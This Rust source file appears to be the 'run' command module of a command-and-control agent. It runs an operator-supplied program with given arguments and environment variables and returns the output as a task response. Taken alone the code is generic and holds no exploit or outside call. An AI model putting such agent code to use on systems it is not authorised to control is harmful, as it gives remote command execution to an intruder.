use crate::structs::Task;
use serde::Deserialize;
use std::collections::HashMap;
use tokio::process::Command;

#[derive(Deserialize)]
struct RunArgs {
    path: String,
    #[serde(default)]
    args: Vec<String>,
    #[serde(default)]
    env: HashMap<String, String>,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let args: RunArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse parameters: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let mut cmd = Command::new(&args.path);
    cmd.args(&args.args);
    for (k, v) in &args.env {
        cmd.env(k, v);
    }

    match cmd.output().await {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            response.user_output = format!("{}{}", stdout, stderr);
            response.completed = true;
        }
        Err(e) => {
            response.set_error(&format!("Failed to execute: {}", e));
        }
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
